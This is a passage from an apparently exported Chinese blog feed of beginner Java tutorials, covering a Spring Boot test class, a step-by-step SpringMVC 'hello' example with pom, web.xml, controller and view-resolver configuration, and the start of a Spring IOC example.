<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--测试的起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>编写测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.MySpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.User;</span><br><span class="line"><span class="keyword">import</span> com.itheima.mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringRunner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br><span class="line"><span class="meta">@SpringBootTest(classes = MySpringBootApplication.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;User&gt; users = userMapper.queryUserList();</span><br><span class="line">        System.out.println(users);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，SpringRunner继承自SpringJUnit4ClassRunner，使用哪一个Spring提供的测试测试引擎都可以</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringRunner</span> <span class="keyword">extends</span> <span class="title">SpringJUnit4ClassRunner</span> </span></span><br></pre></td></tr></table></figure>

<p>@SpringBootTest的属性指定的是引导类的字节码对象</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Java框架</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC入门案例</title>
    <url>/SpringMVC%E5%85%A5%E9%97%A8%E6%A1%88%E4%BE%8B/</url>
    <content><![CDATA[<p>SpringMVC入门案例学习</p>
<span id="more"></span>

<h2 id="1-需求分析"><a href="#1-需求分析" class="headerlink" title="1. 需求分析"></a>1. 需求分析</h2><p><img src="../images/pics/java/1.jpg"> </p>
<ol>
<li>搭建开发的环境</li>
<li>编写入门程序</li>
</ol>
<h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2. 环境搭建"></a>2. 环境搭建</h2><ul>
<li><p>创建一个空的项目</p>
</li>
<li><p>新建一个模块</p>
<p><img src="../images/pics/java/2.jpg"></p>
</li>
<li><p>添加源码目录和资源目录</p>
<p><img src="../images/pics/java/3.jpg"> </p>
</li>
<li><p>pom文件修改</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 修改编译版本为1.8，并添加版本锁定 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 添加依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>配前端控制器（servlet），在web.xml中配置</p>
<p><u>任何请求都会经过该servlet</u></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="../images/pics/java/4.jpg"> </p>
</li>
<li><p>配置spring 配置文件，名字我取的是springmvc.xml</p>
<p><img src="../images/pics/java/5.jpg"></p>
</li>
</ul>
<ul>
<li><p>部署</p>
<p><img src="../images/pics/java/6.jpg"></p>
</li>
</ul>
<p>​        <img src="../images/pics/java/7.jpg"></p>
<h2 id="3-编写入门程序"><a href="#3-编写入门程序" class="headerlink" title="3. 编写入门程序"></a>3. 编写入门程序</h2><h3 id="3-1-修改index-jsp"><a href="#3-1-修改index-jsp" class="headerlink" title="3.1 修改index.jsp"></a>3.1 修改index.jsp</h3><p>打开index.jsp如下</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;Hello World!&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>没有编码信息，我们将其删除，使用idea创建会自动加上</p>
<p><img src="../images/pics/java/8.jpg"> </p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>做个简单改造</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h3&gt;入门程序&lt;/h3&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;&quot;</span>&gt;入门程序&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-2-编写控制器"><a href="#3-2-编写控制器" class="headerlink" title="3.2 编写控制器"></a>3.2 编写控制器</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow;</span><br><span class="line"></span><br><span class="line"><span class="comment">//控制器</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello StringMVC&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="../images/pics/java/9.jpg"></p>
<h3 id="3-3-添加spring的配置"><a href="#3-3-添加spring的配置" class="headerlink" title="3.3 添加spring的配置"></a>3.3 添加spring的配置</h3><p>添加名称空间以及扫描的包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启注解扫描 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.shadowflow&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3-4-添加注解"><a href="#3-4-添加注解" class="headerlink" title="3.4 添加注解"></a>3.4 添加注解</h3><p>给HelloController添加<code>@Controller</code>注解，表示把这个类交给spring ioc容器，添加<code>@RequestMapping</code>注解映射请求路径</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="comment">//控制器</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(path=&quot;/hello&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello StringMVC&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-5-加载springmvc配置文件"><a href="#3-5-加载springmvc配置文件" class="headerlink" title="3.5 加载springmvc配置文件"></a>3.5 加载springmvc配置文件</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;init-param&gt;</code>传入配置文件路径</p>
<p><code>&lt;load-on-startup&gt;</code>一般来说servlet在第一次发请求才创建，配置了这个参数表示启动服务就会创建，然后启动就会创建spring对象</p>
<p>整改文件如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-6-控制器返回"><a href="#3-6-控制器返回" class="headerlink" title="3.6 控制器返回"></a>3.6 控制器返回</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(path=&quot;/hello&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello StringMVC&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回值可以任意写，这里我写的success，success表示返回jsp页面名称</p>
<p>所以创建一个success.jsp</p>
<p><img src="../images/pics/java/10.jpg"></p>
<p>除此之外，还要在springmvc配置文件中配置视图解析器。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 视图解析器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;InternalResourceViewResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/pages/&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加注解支持</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 开启SpringMVC框架注解支持 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>完整springmvc配置文件如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启注解扫描 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.shadowflow&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 视图解析器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;InternalResourceViewResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/pages/&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开启SpringMVC框架注解支持 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="3-7-给index-jsp添加相对路径"><a href="#3-7-给index-jsp添加相对路径" class="headerlink" title="3.7 给index.jsp添加相对路径"></a>3.7 给index.jsp添加相对路径</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">=&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: shadowflow</span><br><span class="line">  Date: <span class="number">2022</span>/<span class="number">3</span>/<span class="number">31</span></span><br><span class="line">  Time: <span class="number">11</span>:<span class="number">58</span> 上午</span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h3&gt;入门程序&lt;/h3&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;hello&quot;</span>&gt;入门程序&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="3-8-启动程序"><a href="#3-8-启动程序" class="headerlink" title="3.8 启动程序"></a>3.8 启动程序</h3><p>启动程序，访问效果</p>
<img src="../images/pics/java/11.jpg" style="zoom:50%;" /> 

<img src="../images/pics/java/12.jpg" style="zoom:50%;" /> 





<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h2><p><strong>步骤：</strong></p>
<ol>
<li><p>启动服务器，加载一些配置</p>
<ul>
<li><code>&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</code> ——&gt; <code>DispatcherServlet</code>对象创建</li>
<li>springmvc.xml</li>
<li>HelloController创建成对象</li>
</ul>
</li>
<li><p>发送请求</p>
</li>
</ol>
<img src="../images/pics/java/13.jpg"/>

<img src="../images/pics/java/14.jpg"/>

]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Java框架</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring框架案例</title>
    <url>/Spring%E6%A1%86%E6%9E%B6%E6%A1%88%E4%BE%8B/</url>
    <content><![CDATA[<p>Spring IOC案例</p>
<span id="more"></span>

<h2 id="1-基于XML的IOC案例1"><a href="#1-基于XML的IOC案例1" class="headerlink" title="1. 基于XML的IOC案例1"></a>1. 基于XML的IOC案例1</h2><h3 id="1-1-创建一个新的maven项目"><a href="#1-1-创建一个新的maven项目" class="headerlink" title="1.1 创建一个新的maven项目"></a>1.1 创建一个新的maven项目</h3><p>修改打包方式为Jar包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.shadowflow<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ioc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>加入如下依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.0.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-dbutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 